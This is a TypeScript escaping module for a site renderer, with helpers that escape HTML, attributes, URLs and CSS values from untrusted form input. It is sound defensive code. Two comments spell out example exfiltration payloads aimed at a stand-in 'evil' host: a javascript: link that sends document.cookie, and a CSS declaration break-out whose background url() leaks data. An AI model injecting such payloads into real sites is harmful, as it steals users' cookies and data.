// ============================================================================
// packages/site-renderer/src/escape.ts
//
// Every string that reaches the output originates in a web form. All of it is
// untrusted, including the theme values — a "colour" is just a string, and a
// string in a CSS declaration can close the declaration and open a new rule.
//
// Templates must route ALL interpolation through these. The one exception is
// markup a template constructs itself from literals.
// ============================================================================

const HTML_ENTITIES: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

/**
 * Text node escaping. Use for anything appearing between tags.
 *
 *   `<h1>${esc(content.hero.title)}</h1>`
 */
export function esc(value: unknown): string {
  if (value == null) return "";
  return String(value).replace(/[&<>"']/g, (ch) => HTML_ENTITIES[ch]);
}

/**
 * Attribute value escaping. Same table as esc(), but named separately so the
 * intent is legible at the call site and so the two can diverge later if
 * needed. Always quote the attribute:
 *
 *   `<a href="${escAttr(url)}">`   ✓
 *   `<a href=${escAttr(url)}>`     ✗ — unquoted attributes break on spaces
 */
export function escAttr(value: unknown): string {
  return esc(value);
}

/**
 * URL sanitiser for href/src.
 *
 * Blocks javascript:, vbscript: and data: (except images). A form field that
 * accepts a "link" will eventually receive `javascript:fetch('//evil/'+document.cookie)`,
 * and on these sites the payload of interest is the contract address.
 *
 * Returns "#" for anything rejected, so the markup stays valid.
 */
export function safeUrl(value: unknown): string {
  if (value == null) return "#";

  const raw = String(value).trim();
  if (raw === "") return "#";

  // Relative, absolute-path, fragment and protocol-relative are all fine.
  if (/^[/#?]/.test(raw)) return escAttr(raw);

  // Strip whitespace and control characters before scheme matching —
  // "java\tscript:" and "java\nscript:" both parse as javascript: in browsers.
  const normalised = raw.replace(/[\u0000-\u0020]/g, "").toLowerCase();

  if (/^(https?|mailto|tel):/.test(normalised)) return escAttr(raw);

  // Inline images only. data:text/html is a same-origin script vector.
  if (/^data:image\/(png|jpe?g|gif|webp|avif);base64,/.test(normalised)) {
    return escAttr(raw);
  }

  // Bare domain, e.g. "example.com/path" — assume https rather than dropping it.
  if (/^[a-z0-9][a-z0-9.-]*\.[a-z]{2,}(\/|$)/i.test(raw)) {
    return escAttr(`https://${raw}`);
  }

  return "#";
}

/**
 * CSS value sanitiser.
 *
 * THIS IS THE ONE PEOPLE MISS. A theme colour goes straight into a stylesheet:
 *
 *   --st-color-bg: ${theme.colors.background};
 *
 * A value of `red; } body { background: url(https://evil/log?c=` closes the
 * rule and injects a new one that exfiltrates via a background request. Same
 * for font-family strings and any other free-text token.
 *
 * Strips braces, semicolons, comment delimiters, @-rules, and any url() whose
 * target is not an allowed scheme.
 */
export function cssValue(value: unknown, fallback = "inherit"): string {
  if (value == null) return fallback;

  const raw = String(value).trim();
  if (raw === "") return fallback;

  // Structural characters that could break out of the declaration.
  if (/[{}\\;]/.test(raw)) return fallback;
  // Comment delimiters can be used to hide payloads from naive filters.
  if (raw.includes("/*") || raw.includes("*/")) return fallback;
  // No nested at-rules.
  if (raw.includes("@")) return fallback;
  // expression() is legacy IE but costs nothing to block.
  if (/expression\s*\(/i.test(raw)) return fallback;

  // url() is permitted only for http(s) and inline images. Background images
  // legitimately need it; anything else does not.
  const urlMatches = raw.matchAll(/url\s*\(\s*['"]?([^'")]+)['"]?\s*\)/gi);
  for (const match of urlMatches) {
    const target = match[1].replace(/[\u0000-\u0020]/g, "").toLowerCase();
    const ok =
      /^https?:\/\//.test(target) ||
      /^\//.test(target) ||
      /^data:image\//.test(target);
    if (!ok) return fallback;
  }

  return raw;
}

/**
 * CSS custom property NAME sanitiser. Template-scoped tokens come from a
 * manifest's customThemeSchema, whose keys are author-controlled.
 */
export function cssIdent(value: string): string {
  return value.replace(/[^a-zA-Z0-9_-]/g, "");
}

/**
 * Serialise an attribute map, omitting empty values.
 *
 *   attrs({ id: slug, class: "section", "data-x": undefined })
 *   -> ` id="about" class="section"`
 */
export function attrs(map: Record<string, string | number | boolean | undefined | null>): string {
  const parts: string[] = [];

  for (const [key, value] of Object.entries(map)) {
    if (value == null || value === false || value === "") continue;
    // Boolean attributes render bare: `<button disabled>`
    if (value === true) {
      parts.push(cssIdent(key));
      continue;
    }
    parts.push(`${cssIdent(key)}="${escAttr(value)}"`);
  }

  return parts.length ? ` ${parts.join(" ")}` : "";
}

/**
 * Join class names, dropping falsy entries.
 */
export function cx(...names: Array<string | false | null | undefined>): string {
  return names.filter(Boolean).join(" ");
}